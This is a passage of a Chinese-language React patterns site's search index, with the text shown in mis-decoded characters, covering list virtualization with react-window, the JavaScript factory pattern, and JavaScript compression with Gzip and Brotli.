è®ºå¦‚ä½•ï¼Œæœ€ç»ˆçš„åŠŸèƒ½éå¸¸æ¥è¿‘ã€‚\nç¼ºå°‘çš„ç»„ä»¶æ˜¯ WindowScroller å’Œ AutoSizerâ€¦â€¦æˆ‘ä»¬æ¥ä¸‹æ¥ä¼šçœ‹åˆ°å®ƒä»¬ã€‚\n...\rreturn (\r\u0026lt;section\u0026gt;\r\u0026lt;AutoSizer disableHeight\u0026gt;\r{({width}) =\u0026gt; {\rconst {movies, hasMore} = this.props;\rconst rowCount = getRowsAmount(width, movies.length, hasMore);\r...\rreturn (\r\u0026lt;InfiniteLoader\rref={this.infiniteLoaderRef}\r...\r{({onRowsRendered, registerChild}) =\u0026gt; (\r\u0026lt;WindowScroller\u0026gt;\r{({height, scrollTop}) =\u0026gt; ( react-window ç¼ºå°‘ä»€ä¹ˆï¼Ÿ react-window è¿˜æ²¡æœ‰ react-virtualized çš„å®Œæ•´ API è¡¨é¢ï¼Œæ‰€ä»¥å¦‚æœè€ƒè™‘å®ƒï¼Œè¯·æ£€æŸ¥æ¯”è¾ƒæ–‡æ¡£ã€‚ ç¼ºå°‘äº†ä»€ä¹ˆï¼Ÿ\n  WindowScroller - è¿™æ˜¯ä¸€ä¸ª react-virtualized ç»„ä»¶ï¼Œå¯ä»¥æ ¹æ®çª—å£çš„æ»šåŠ¨ä½ç½®æ»šåŠ¨åˆ—è¡¨ã€‚ ç›®å‰æ²¡æœ‰è®¡åˆ’ä¸º react-window å®ç°æ­¤åŠŸèƒ½ï¼Œå› æ­¤æ‚¨éœ€è¦åœ¨ç”¨æˆ·ç©ºé—´ä¸­è§£å†³æ­¤é—®é¢˜ã€‚\n  AutoSizer - HOC å¯ä»¥é€‚åº”æ‰€æœ‰å¯ç”¨ç©ºé—´ï¼Œè‡ªåŠ¨è°ƒæ•´å•ä¸ªå­©å­çš„å®½åº¦å’Œé«˜åº¦ã€‚ Brian å°†å…¶ä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„åŒ…æ¥å®ç°ã€‚ å…³æ³¨æ­¤é—®é¢˜ä»¥è·å–æœ€æ–°ä¿¡æ¯ã€‚\n  CellMeasurer - HOC é€šè¿‡ä»¥ç”¨æˆ·ä¸å¯è§çš„æ–¹å¼å‘ˆç°å•å…ƒæ ¼çš„å†…å®¹æ¥è‡ªåŠ¨æµ‹é‡å•å…ƒæ ¼çš„å†…å®¹ã€‚ åœ¨æ­¤å¤„å…³æ³¨æœ‰å…³æ”¯æŒçš„è®¨è®ºã€‚\n  ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å‘ç° react-window å¼€ç®±å³ç”¨ï¼Œè¶³ä»¥æ»¡è¶³æˆ‘ä»¬çš„å¤§éƒ¨åˆ†éœ€æ±‚ã€‚\n\rç½‘ç»œå¹³å°çš„æ”¹è¿› ä¸€äº›ç°ä»£æµè§ˆå™¨ç°åœ¨æ”¯æŒ CSS å†…å®¹å¯è§æ€§ã€‚\ncontent-visibility:auto å…è®¸æ‚¨è·³è¿‡æ¸²æŸ“å’Œç»˜åˆ¶å±å¹•å¤–å†…å®¹ï¼Œç›´åˆ°éœ€è¦ä¸ºæ­¢ã€‚\nå¦‚æœæ‚¨çš„ HTML æ–‡æ¡£å¾ˆé•¿ä¸”æ¸²æŸ“æˆæœ¬å¾ˆé«˜ï¼Œè¯·è€ƒè™‘å°è¯•ä½¿ç”¨è¯¥å±æ€§ã€‚\nå¯¹äºæ¸²æŸ“åŠ¨æ€å†…å®¹åˆ—è¡¨ï¼Œæˆ‘ä»ç„¶å»ºè®®ä½¿ç”¨åƒ react-window è¿™æ ·çš„åº“ã€‚\nå¾ˆéš¾æ‹¥æœ‰è¿™æ ·ä¸€ä¸ªåº“çš„ content-visbility:hidden ç‰ˆæœ¬ï¼Œå®ƒå¯ä»¥åƒä»Šå¤©è®¸å¤šåˆ—è¡¨è™šæ‹ŸåŒ–åº“é‚£æ ·åœ¨å±å¹•å¤–ç§¯æä½¿ç”¨ display:none æˆ–åˆ é™¤ DOM èŠ‚ç‚¹æ¥å‡»è´¥ä¸€ä¸ªç‰ˆæœ¬ã€‚\n\rè¿›ä¸€æ­¥é˜…è¯» å¦‚éœ€è¿›ä¸€æ­¥äº†è§£ react-window å’Œ react-virtualizedï¼Œè¯·æŸ¥çœ‹ï¼š\n  ä½¿ç”¨ react-window æ¸²æŸ“æ€§èƒ½åˆ—è¡¨\n  ä½¿ç”¨çª—å£åˆ›å»ºæ›´é«˜æ•ˆçš„ React è§†å›¾\n  ä½¿ç”¨ react-virtualized æ¸²æŸ“åˆ—è¡¨\n  ä½¿ç”¨ react-virtualized æ¸²æŸ“å¤§å‹åˆ—è¡¨\n  \rçŸ¥è¯†ç‚¹    ","description":"ä½¿ç”¨åˆ—è¡¨è™šæ‹ŸåŒ–ä¼˜åŒ–åˆ—è¡¨æ€§èƒ½","id":131,"section":"react-patterns","tags":null,"title":"åˆ—è¡¨è™šæ‹ŸåŒ–","uri":"https://codthing.github.io/react-patterns/performance-patterns/virtual-lists/"},{"content":"ä½¿ç”¨å·¥å‚æ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å·¥å‚å‡½æ•°æ¥åˆ›å»ºæ–°å¯¹è±¡ã€‚\nå½“ä¸€ä¸ªå‡½æ•°åœ¨ä¸ä½¿ç”¨ new å…³é”®å­—çš„æƒ…å†µä¸‹è¿”å›ä¸€ä¸ªæ–°å¯¹è±¡æ—¶ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªå·¥å‚å‡½æ•°ï¼\n\rç”¨æˆ·æ¡ˆä¾‹ å‡è®¾æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºéœ€è¦å¾ˆå¤šç”¨æˆ·ã€‚\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ firstNameã€lastName å’Œ email å±æ€§åˆ›å»ºæ–°ç”¨æˆ·ã€‚\nå·¥å‚å‡½æ•°è¿˜å‘æ–°åˆ›å»ºçš„å¯¹è±¡æ·»åŠ äº† fullName å±æ€§ï¼Œè¯¥å±æ€§è¿”å› firstName å’Œ lastNameã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  const createUser = ({ firstName, lastName, email }) =\u0026gt; ({ firstName, lastName, email, fullName() { return `${this.firstName}${this.lastName}`; } }); const user1 = createUser({ firstName: \u0026#34;John\u0026#34;, lastName: \u0026#34;Doe\u0026#34;, email: \u0026#34;john@doe.com\u0026#34; }); const user2 = createUser({ firstName: \u0026#34;Jane\u0026#34;, lastName: \u0026#34;Doe\u0026#34;, email: \u0026#34;jane@doe.com\u0026#34; }); console.log(user1); // {firstName: \u0026#34;John\u0026#34;, lastName: \u0026#34;Doe\u0026#34;, email: \u0026#34;john@doe.com\u0026#34;, fullName: Æ’ fullName()} console.log(user2); // {firstName: \u0026#34;Jane\u0026#34;, lastName: \u0026#34;Doe\u0026#34;, email: \u0026#34;jane@doe.com\u0026#34;, fullName: Æ’ fullName()}   Perfect! é€šè¿‡è°ƒç”¨ createUser å‡½æ•°è½»æ¾åˆ›å»ºå¤šä¸ªç”¨æˆ·ã€‚\nå¦‚æœè¦åˆ›å»ºç›¸å¯¹å¤æ‚å’Œå¯é…ç½®çš„å¯¹è±¡ï¼Œå·¥å‚æ¨¡å¼ä¼šå¾ˆæœ‰ç”¨ã€‚\né”®å’Œå€¼çš„å€¼å¯èƒ½ä¾èµ–äºç‰¹å®šç¯å¢ƒæˆ–é…ç½®ã€‚\nä½¿ç”¨å·¥å‚æ¨¡å¼ï¼Œå¯ä»¥è½»æ¾åˆ›å»ºåŒ…å«è‡ªå®šä¹‰é”®å’Œå€¼çš„æ–°å¯¹è±¡ï¼\nconst createObjectFromArray = ([key, value]) =\u0026gt; ({\r[key]: value\r});\rcreateObjectFromArray([\u0026#34;name\u0026#34;, \u0026#34;John\u0026#34;]); // { name: \u0026#34;John\u0026#34; } \rä¼˜ç‚¹ å½“æˆ‘ä»¬å¿…é¡»åˆ›å»ºå¤šä¸ªå…±äº«ç›¸åŒå±æ€§çš„è¾ƒå°å¯¹è±¡æ—¶ï¼Œå·¥å‚æ¨¡å¼å¾ˆæœ‰ç”¨ã€‚\nå·¥å‚å‡½æ•°å¯ä»¥æ ¹æ®å½“å‰ç¯å¢ƒæˆ–ç”¨æˆ·ç‰¹å®šçš„é…ç½®è½»æ¾è¿”å›è‡ªå®šä¹‰å¯¹è±¡ã€‚\nå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™å°±æ˜¯æ‚¨æ‰€éœ€è¦çš„ï¼Œä½†å› ä¸ºè¿™æ˜¯ JavaScriptï¼Œæ‰€ä»¥è¿˜æœ‰å¦ä¸€ç§æ–¹æ³•è®©å®ƒæ„Ÿè§‰æ›´åƒ Javaï¼šclasså…³é”®å­—ã€‚\nclass User {\rconstructor(firstName, lastName, email) {\rthis.firstName = firstName;\rthis.lastName = lastName;\rthis.email = email;\r}\rfullName() {\rreturn `${this.firstName} ${this.lastName}`;\r}\r}\rconst user1 = new User({\rfirstName: \u0026#34;John\u0026#34;,\rlastName: \u0026#34;Doe\u0026#34;,\remail: \u0026#34;john@doe.com\u0026#34;\r});\rconst user2 = new User({\rfirstName: \u0026#34;Jane\u0026#34;,\rlastName: \u0026#34;Doe\u0026#34;,\remail: \u0026#34;jane@doe.com\u0026#34;\r}); åœ¨ JavaScript ä¸­ï¼Œç±»æ¯”å·¥å‚æ›´åŠ å†—é•¿å’Œé™åˆ¶ï¼Œå¹¶ä¸”åœ¨é‡æ„æ–¹é¢æœ‰ç‚¹é›·åŒºï¼Œä½†å®ƒä»¬ä¹Ÿè¢« React å’Œ Angular ç­‰ä¸»è¦å‰ç«¯æ¡†æ¶æ‰€æ¥å—ï¼Œå¹¶ä¸”æœ‰ä¸€äº›ç½•è§çš„ç”¨é€”- ä½¿å¤æ‚æ€§å€¼å¾—çš„æ¡ˆä¾‹ã€‚\n â€œæœ‰æ—¶ï¼Œä¼˜é›…çš„å®ç°åªæ˜¯ä¸€ä¸ªåŠŸèƒ½ã€‚ä¸æ˜¯æ–¹æ³•ã€‚ä¸æ˜¯ä¸€ä¸ªç±»ã€‚ä¸æ˜¯æ¡†æ¶ã€‚åªæ˜¯ä¸€ä¸ªåŠŸèƒ½ã€‚â€ ~ çº¦ç¿° å¡é©¬å…‹\n ä»æœ€ç®€å•çš„å®ç°å¼€å§‹ï¼Œä»…åœ¨éœ€è¦æ—¶è½¬å‘æ›´å¤æ‚çš„å®ç°ã€‚\n\rç¼ºç‚¹ ä½†æ˜¯ï¼Œåœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæ¯æ¬¡åˆ›å»ºæ–°å®ä¾‹è€Œä¸æ˜¯æ–°å¯¹è±¡å¯èƒ½ä¼šæ›´æ¶ˆè€—å†…å­˜ã€‚\n\rçŸ¥è¯†ç‚¹   å¯¹è±¡å­—é¢é‡ {}\n  å½“ä¸€ä¸ªå‡½æ•°åœ¨ä¸ä½¿ç”¨ new å…³é”®å­—çš„æƒ…å†µä¸‹è¿”å›ä¸€ä¸ªæ–°å¯¹è±¡æ—¶ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªå·¥å‚å‡½æ•°ï¼\n  ","description":"ä½¿ç”¨å·¥å‚å‡½æ•°æ¥åˆ›å»ºå¯¹è±¡","id":132,"section":"react-patterns","tags":null,"title":"å·¥å‚æ¨¡å¼","uri":"https://codthing.github.io/react-patterns/design-patterns/factory-pattern/"},{"content":"å‹ç¼© JavaScript å¹¶å¯†åˆ‡å…³æ³¨å—å¤§å°ä»¥è·å¾—æœ€ä½³æ€§èƒ½ã€‚\nè¿‡é«˜çš„ JavaScript åŒ…ç²’åº¦æœ‰åŠ©äºé‡å¤æ•°æ®åˆ é™¤å’Œç¼“å­˜ï¼Œä½†å¯èƒ½ä¼šåœ¨ 50-100 ä¸ªå—èŒƒå›´å†…å—åˆ°è¾ƒå·®çš„å‹ç¼©å’Œå½±å“åŠ è½½ï¼ˆç”±äºæµè§ˆå™¨è¿›ç¨‹ã€ç¼“å­˜æ£€æŸ¥ç­‰ï¼‰ã€‚\næœ€ç»ˆï¼Œé€‰æ‹©æœ€é€‚åˆæ‚¨çš„å‹ç¼©ç­–ç•¥ã€‚\nJavaScript æ˜¯é¡µé¢å¤§å°çš„ç¬¬äºŒå¤§è´¡çŒ®è€…ï¼Œä¹Ÿæ˜¯äº’è”ç½‘ä¸Šä»…æ¬¡äºå›¾åƒçš„ç¬¬äºŒå¤§è¯·æ±‚é‡ã€‚\nå‡å°‘ JavaScript ä¼ è¾“ã€åŠ è½½å’Œæ‰§è¡Œæ—¶é—´çš„æ¨¡å¼æ¥æé«˜ç½‘ç«™æ€§èƒ½ã€‚ å‹ç¼©æœ‰åŠ©äºå‡å°‘é€šè¿‡ç½‘ç»œä¼ è¾“è„šæœ¬æ‰€éœ€çš„æ—¶é—´ã€‚\nå°†å‹ç¼©ä¸å…¶ä»–æŠ€æœ¯ï¼ˆä¾‹å¦‚ç¼©å°ã€ä»£ç æ‹†åˆ†ã€æ†ç»‘ã€ç¼“å­˜å’Œå»¶è¿ŸåŠ è½½ï¼‰ç»“åˆä½¿ç”¨ï¼Œä»¥å‡å°‘å¤§é‡ JavaScript å¯¹æ€§èƒ½çš„å½±å“ã€‚\nç„¶è€Œï¼Œè¿™äº›æŠ€æœ¯çš„ç›®æ ‡æœ‰æ—¶ä¼šç›¸äº’çŸ›ç›¾ã€‚\næœ¬èŠ‚æ¢è®¨ JavaScript å‹ç¼©æŠ€æœ¯ï¼Œå¹¶è®¨è®ºåœ¨å†³å®šä»£ç æ‹†åˆ†å’Œå‹ç¼©ç­–ç•¥æ—¶åº”è€ƒè™‘çš„ç»†å¾®å·®åˆ«ã€‚\n  Gzip å’Œ Brotli æ˜¯å‹ç¼© JavaScript çš„æœ€å¸¸ç”¨æ–¹æ³•ï¼Œå¹¶ä¸”è¢«ç°ä»£æµè§ˆå™¨å¹¿æ³›æ”¯æŒã€‚\n  Brotli åœ¨ç±»ä¼¼çš„å‹ç¼©çº§åˆ«ä¸‹æä¾›æ›´å¥½çš„å‹ç¼©ç‡ã€‚\n  Next.js é»˜è®¤æä¾› Gzip å‹ç¼©ã€‚ ä½†å»ºè®®åœ¨åƒ Nginx è¿™æ ·çš„ HTTP ä»£ç†ä¸Šå¯ç”¨å®ƒã€‚\n  å¦‚æœä½¿ç”¨ Webpack æ¥æ†ç»‘ä»£ç ï¼Œå¯ä»¥ä½¿ç”¨ CompressionPlugin è¿›è¡Œ Gzip å‹ç¼©æˆ–ä½¿ç”¨ BrotliWebpackPlugin è¿›è¡Œ Brotli å‹ç¼©ã€‚\n  åœ¨åˆ‡æ¢åˆ° Brotli å‹ç¼©è€Œä¸æ˜¯ Gzip åï¼ŒOyo çš„æ–‡ä»¶å¤§å°å‡å°‘äº† 15-20%ï¼ŒWix çš„æ–‡ä»¶å¤§å°å‡å°‘äº† 21-25%ã€‚\n  compress(a + b) \u0026lt;= compress(a) + compress(b) - å•ä¸ªå¤§åŒ…æ¯”å¤šä¸ªå°åŒ…æä¾›æ›´å¥½çš„å‹ç¼©ã€‚ è¿™ä¼šå¯¼è‡´é‡å¤æ•°æ®åˆ é™¤å’Œç¼“å­˜ä¸æµè§ˆå™¨æ€§èƒ½å’Œå‹ç¼©ä¸ä¸€è‡´çš„ç²’åº¦æƒè¡¡ã€‚ ç²’åº¦åˆ†å—å¯ä»¥å¸®åŠ©å¤„ç†è¿™ç§æƒè¡¡ã€‚\n  \rHTTP å‹ç¼© å‹ç¼©å¯å‡å°æ–‡æ¡£å’Œæ–‡ä»¶çš„å¤§å°ï¼Œå› æ­¤å®ƒä»¬å ç”¨çš„ç£ç›˜ç©ºé—´æ¯”åŸå§‹æ–‡ä»¶å°‘ã€‚\nè¾ƒå°çš„æ–‡æ¡£æ¶ˆè€—è¾ƒä½çš„å¸¦å®½ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œå¿«é€Ÿä¼ è¾“ã€‚\nHTTP å‹ç¼©ä½¿ç”¨è¿™ä¸ªç®€å•çš„æ¦‚å¿µæ¥å‹ç¼©ç½‘ç«™å†…å®¹ã€å‡å°‘é¡µé¢æƒé‡ã€é™ä½å¸¦å®½è¦æ±‚å¹¶æé«˜æ€§èƒ½ã€‚\nHTTP æ•°æ®å‹ç¼©å¯ä»¥æŒ‰ä¸åŒæ–¹å¼åˆ†ç±»ã€‚å…¶ä¸­ä¹‹ä¸€æ˜¯æœ‰æŸä¸æ— æŸã€‚\næœ‰æŸå‹ç¼©æ„å‘³ç€å‹ç¼©-è§£å‹ç¼©å¾ªç¯ä¼šåœ¨ä¿ç•™å…¶å¯ç”¨æ€§çš„åŒæ—¶äº§ç”Ÿç¨å¾®æ”¹å˜çš„æ–‡æ¡£ã€‚æœ€ç»ˆç”¨æˆ·å‡ ä¹å¯Ÿè§‰ä¸åˆ°è¿™ç§å˜åŒ–ã€‚æœ€å¸¸è§çš„æœ‰æŸå‹ç¼©ç¤ºä¾‹æ˜¯å›¾åƒçš„ JPEG å‹ç¼©ã€‚\nä½¿ç”¨æ— æŸå‹ç¼©ï¼Œå‹ç¼©å’Œè§£å‹åæ¢å¤çš„æ•°æ®å°†ä¸åŸå§‹æ•°æ®ç²¾ç¡®åŒ¹é…ã€‚ PNG å›¾åƒæ˜¯æ— æŸå‹ç¼©çš„ä¸€ä¸ªä¾‹å­ã€‚æ— æŸå‹ç¼©ä¸æ–‡æœ¬ä¼ è¾“ç›¸å…³ï¼ŒåŸºäºæ–‡æœ¬çš„æ ¼å¼ï¼Œä¾‹å¦‚ HTMLã€CSS å’Œ JavaScriptã€‚\nç”±äºå¸Œæœ›æµè§ˆå™¨ä¸Šæ‰€æœ‰æœ‰æ•ˆçš„ JS ä»£ç ï¼Œåº”è¯¥å¯¹ JavaScript ä»£ç ä½¿ç”¨æ— æŸå‹ç¼©ç®—æ³•ã€‚\nåœ¨å‹ç¼© JS ä¹‹å‰ï¼Œç¼©å°æœ‰åŠ©äºæ¶ˆé™¤ä¸å¿…è¦çš„è¯­æ³•å¹¶å°†å…¶å‡å°‘åˆ°ä»…æ‰§è¡Œæ‰€éœ€çš„ä»£ç ã€‚\n\rç¼©å° ä¸ºäº†å‡å°‘è´Ÿè½½å¤§å°ï¼Œå¯ä»¥åœ¨å‹ç¼©ä¹‹å‰ç¼©å° JavaScriptã€‚\nç¼©å°é€šè¿‡åˆ é™¤ç©ºæ ¼å’Œä»»ä½•ä¸å¿…è¦çš„ä»£ç æ¥åˆ›å»ºä¸€ä¸ªæ›´å°ä½†å®Œå…¨æœ‰æ•ˆçš„ä»£ç æ–‡ä»¶æ¥è¡¥å……å‹ç¼©ã€‚\nåœ¨ç¼–å†™ä»£ç æ—¶ï¼Œæˆ‘ä»¬ä½¿ç”¨æ¢è¡Œã€ç¼©è¿›ã€ç©ºæ ¼ã€å‘½åè‰¯å¥½çš„å˜é‡å’Œæ³¨é‡Šæ¥æé«˜ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚\nä½†æ˜¯ï¼Œè¿™äº›å…ƒç´ ä¼šå½±å“ JavaScript çš„æ•´ä½“å¤§å°ï¼Œå¹¶ä¸”ä¸æ˜¯åœ¨æµè§ˆå™¨ä¸Šæ‰§è¡Œæ‰€å¿…éœ€çš„ã€‚\nç¼©å°å°† JavaScript ä»£ç å‡å°‘åˆ°æˆåŠŸæ‰§è¡Œæ‰€éœ€çš„æœ€ä½é™åº¦ã€‚\nç¼©å°æ˜¯ JS å’Œ CSS ä¼˜åŒ–çš„æ ‡å‡†åšæ³•ã€‚\nJavaScript åº“å¼€å‘äººå‘˜é€šå¸¸ä¼šä¸ºç”Ÿäº§éƒ¨ç½²æä¾›å…¶æ–‡ä»¶çš„ç¼©å°ç‰ˆæœ¬ï¼Œé€šå¸¸ç”¨ min.js æ‰©å±•åè¡¨ç¤ºã€‚ ï¼ˆä¾‹å¦‚ï¼Œjquery.js å’Œ jquery.min.jsï¼‰\næœ‰å¤šç§å·¥å…·å¯ç”¨äºç¼©å° HTMLã€CSS å’Œ JS èµ„æºã€‚\nTerser æ˜¯ ES6+ çš„æµè¡Œ JavaScript å‹ç¼©å·¥å…·ï¼ŒWebpack v4 é»˜è®¤ä¸ºè¿™ä¸ªåº“åŒ…å«ä¸€ä¸ªæ’ä»¶ï¼Œç”¨äºåˆ›å»ºç¼©å°çš„æ„å»ºæ–‡ä»¶ã€‚\nè¿˜å¯ä»¥å°† TerserWebpackPlugin ä¸æ—§ç‰ˆæœ¬çš„ Webpack ä¸€èµ·ä½¿ç”¨ï¼Œæˆ–è€…å°† Terser ç”¨ä½œæ²¡æœ‰æ¨¡å—æ†ç»‘å™¨çš„ CLI å·¥å…·ã€‚\n\ré™æ€ä¸åŠ¨æ€å‹ç¼© ç¼©å°æœ‰åŠ©äºæ˜¾ç€å‡å°æ–‡ä»¶å¤§å°ï¼Œä½† JS çš„å‹ç¼©å¯ä»¥æä¾›æ›´æ˜¾ç€çš„æ”¶ç›Šã€‚\nå¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼å®ç°æœåŠ¡å™¨ç«¯å‹ç¼©ã€‚\né™æ€å‹ç¼©ï¼šå¯ä»¥ä½¿ç”¨é™æ€å‹ç¼©æ¥é¢„å‹ç¼©èµ„æºå¹¶åœ¨æ„å»ºè¿‡ç¨‹ä¸­æå‰ä¿å­˜å®ƒä»¬ã€‚\nåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨æ›´é«˜çš„å‹ç¼©çº§åˆ«æ¥ç¼©çŸ­ä»£ç çš„ä¸‹è½½æ—¶é—´ã€‚\né«˜æ„å»ºæ—¶é—´ä¸ä¼šå½±å“ç½‘ç«™æ€§èƒ½ã€‚å¦‚æœå¯¹ä¸ç»å¸¸æ›´æ”¹çš„æ–‡ä»¶ä½¿ç”¨é™æ€å‹ç¼©ï¼Œé‚£å°†æ˜¯æœ€å¥½çš„ã€‚\nåŠ¨æ€å‹ç¼©ï¼šé€šè¿‡è¿™ä¸ªè¿‡ç¨‹ï¼Œå½“æµè§ˆå™¨è¯·æ±‚èµ„æºæ—¶ï¼Œå‹ç¼©ä¼šå³æ—¶è¿›è¡Œã€‚\nåŠ¨æ€å‹ç¼©æ›´å®¹æ˜“å®ç°ï¼Œä½†åªèƒ½ä½¿ç”¨è¾ƒä½çš„å‹ç¼©çº§åˆ«ã€‚\næ›´é«˜çš„å‹ç¼©çº§åˆ«å°†éœ€è¦æ›´å¤šçš„æ—¶é—´ï¼Œå¹¶ä¸”å°†å¤±å»ä»è¾ƒå°çš„å†…å®¹å¤§å°ä¸­è·å¾—çš„ä¼˜åŠ¿ã€‚\nå¦‚æœå¯¹ç»å¸¸æ›´æ”¹æˆ–ç”±åº”ç”¨ç¨‹åºç”Ÿæˆçš„å†…å®¹ä½¿ç”¨åŠ¨æ€å‹ç¼©ï¼Œè¿™å°†æœ‰æ‰€å¸®åŠ©ã€‚\nå¯ä»¥æ ¹æ®åº”ç”¨ç¨‹åºå†…å®¹çš„ç±»å‹ä½¿ç”¨é™æ€æˆ–åŠ¨æ€å‹ç¼©ã€‚\nå¯ä»¥ä½¿ç”¨æµè¡Œçš„å‹ç¼©ç®—æ³•å¯ç”¨é™æ€å’ŒåŠ¨æ€å‹ç¼©ï¼Œä½†æ¯ç§æƒ…å†µä¸‹æ¨èçš„å‹ç¼©çº§åˆ«æ˜¯ä¸åŒçš„ã€‚\nè®©æˆ‘ä»¬çœ‹çœ‹å‹ç¼©ç®—æ³•ä»¥æ›´å¥½åœ°ç†è§£è¿™ä¸€ç‚¹ã€‚\n\rå‹ç¼©ç®—æ³• Gzip å’Œ Brotli æ˜¯å½“ä»Šç”¨äºå‹ç¼© HTTP æ•°æ®çš„ä¸¤ç§æœ€å¸¸ç”¨çš„ç®—æ³•ã€‚\nGzip Gzip å‹ç¼©æ ¼å¼å·²ç»å­˜åœ¨è¿‘ 30 å¹´ï¼Œæ˜¯ä¸€ç§åŸºäº Deflate ç®—æ³•çš„æ— æŸç®—æ³•ã€‚ deflate ç®—æ³•æœ¬èº«å¯¹è¾“å…¥æ•°æ®æµä¸­çš„æ•°æ®å—ä½¿ç”¨ LZ77 ç®—æ³•å’Œéœå¤«æ›¼ç¼–ç çš„ç»„åˆã€‚\nLZ77 ç®—æ³•è¯†åˆ«é‡å¤çš„å­—ç¬¦ä¸²å¹¶ç”¨åå‘å¼•ç”¨æ›¿æ¢å®ƒä»¬ï¼Œåå‘å¼•ç”¨æ˜¯æŒ‡å‘å®ƒå…ˆå‰å‡ºç°çš„ä½ç½®çš„æŒ‡é’ˆï¼Œåè·Ÿå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ éšåï¼Œéœå¤«æ›¼ç¼–ç è¯†åˆ«å‡ºå¸¸ç”¨çš„å¼•ç”¨å¹¶å°†å®ƒä»¬æ›¿æ¢ä¸ºå…·æœ‰è¾ƒçŸ­ä½åºåˆ—çš„å¼•ç”¨ã€‚ è¾ƒé•¿çš„ä½åºåˆ—ç”¨äºè¡¨ç¤ºä¸ç»å¸¸ä½¿ç”¨çš„å¼•ç”¨ã€‚\næ‰€æœ‰ä¸»æµæµè§ˆå™¨éƒ½æ”¯æŒ Gzipã€‚\nZopfli å‹ç¼©ç®—æ³•æ˜¯ Deflate/Gzip çš„è¾ƒæ…¢ä½†æ”¹è¿›çš„ç‰ˆæœ¬ï¼Œç”Ÿæˆæ›´å°çš„ GZip å…¼å®¹æ–‡ä»¶ã€‚ å®ƒæœ€é€‚åˆé™æ€å‹ç¼©ï¼Œå¯ä»¥æä¾›æ›´æ˜¾ç€çš„æ”¶ç›Šã€‚\nBrotli 2015å¹´ï¼Œè°·æ­Œæ¨å‡ºäº†Brotliç®—æ³•å’ŒBrotliå‹ç¼©æ•°æ®æ ¼å¼ã€‚\nä¸ GZip ä¸€æ ·ï¼ŒBrotli ä¹Ÿæ˜¯ä¸€ç§åŸºäº LZ77 ç®—æ³•å’Œéœå¤«æ›¼ç¼–ç çš„æ— æŸç®—æ³•ã€‚\næ­¤å¤–ï¼Œå®ƒä½¿ç”¨äºŒé˜¶ä¸Šä¸‹æ–‡å»ºæ¨¡ä»¥ç±»ä¼¼çš„é€Ÿåº¦äº§ç”Ÿæ›´å¯†é›†çš„å‹ç¼©ã€‚\nä¸Šä¸‹æ–‡å»ºæ¨¡æ˜¯ä¸€é¡¹åŠŸèƒ½ï¼Œå®ƒå…è®¸åœ¨åŒä¸€å—ä¸­ä¸ºåŒä¸€å­—æ¯è¡¨ä½¿ç”¨å¤šä¸ªå“ˆå¤«æ›¼æ ‘ã€‚\nBrotli è¿˜æ”¯æŒç”¨äºåå‘å¼•ç”¨çš„æ›´å¤§çª—å£å¤§å°ï¼Œå¹¶å…·æœ‰é™æ€å­—å…¸ã€‚ è¿™äº›åŠŸèƒ½æœ‰åŠ©äºæé«˜å…¶ä½œä¸ºå‹ç¼©ç®—æ³•çš„æ•ˆç‡ã€‚\nBrotli å—åˆ°å½“ä»Šæ‰€æœ‰ä¸»è¦æœåŠ¡å™¨å’Œæµè§ˆå™¨çš„æ”¯æŒï¼Œå¹¶ä¸”æ­£å˜å¾—è¶Šæ¥è¶Šæµè¡Œã€‚\nå®ƒè¿˜å—æ‰˜ç®¡æä¾›å•†å’Œä¸­é—´ä»¶ï¼ˆåŒ…æ‹¬ Netlifyã€AWS å’Œ Vercelï¼‰çš„æ”¯æŒå¹¶ä¸”å¯ä»¥è½»æ¾å¯ç”¨ã€‚\næ‹¥æœ‰åºå¤§ç”¨æˆ·ç¾¤çš„ç½‘ç«™ï¼Œä¾‹å¦‚ OYO å’Œ Wixï¼Œåœ¨å°† Gzip æ›¿æ¢ä¸º Brotli åï¼Œå…¶æ€§èƒ½æœ‰äº†å¾ˆå¤§çš„æå‡ã€‚\nGzip vs Brotli ä¸‹è¡¨æ˜¾ç¤ºäº†ä¸åŒå‹ç¼©çº§åˆ«ä¸‹ Brotli å’Œ Gzip å‹ç¼©ç‡å’Œé€Ÿåº¦çš„åŸºå‡†æ¯”è¾ƒã€‚\næ­¤å¤–ï¼Œä»¥ä¸‹æ˜¯ Chrome å¯¹ä½¿ç”¨ Gzip å’Œ Brotli å‹ç¼© JS çš„ç ”ç©¶çš„ä¸€äº›è§è§£\n  Gzip 9 çš„å‹ç¼©ç‡æœ€å¥½ï¼Œå‹ç¼©é€Ÿåº¦ä¹Ÿä¸é”™ï¼Œåœ¨ä½¿ç”¨å…¶ä»–çº§åˆ«çš„ Gzip ä¹‹å‰åº”è¯¥è€ƒè™‘ä½¿ç”¨å®ƒã€‚\n  å¯¹äº Brotliï¼Œè¯·è€ƒè™‘ 6-11 çº§ã€‚ å¦åˆ™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Gzip æ›´å¿«åœ°å®ç°ç±»ä¼¼çš„å‹ç¼©ç‡ã€‚\n  åœ¨æ‰€æœ‰å¤§å°èŒƒå›´å†…ï¼ŒBrotli 9-11 çš„æ€§èƒ½éƒ½æ¯” Gzip å¥½å¾—å¤šï¼Œä½†é€Ÿåº¦å¾ˆæ…¢ã€‚\n  æ†ç»‘åŒ…è¶Šå¤§ï¼Œæ‚¨å°†è·å¾—æ›´å¥½çš„å‹ç¼©ç‡å’Œé€Ÿåº¦ã€‚\n  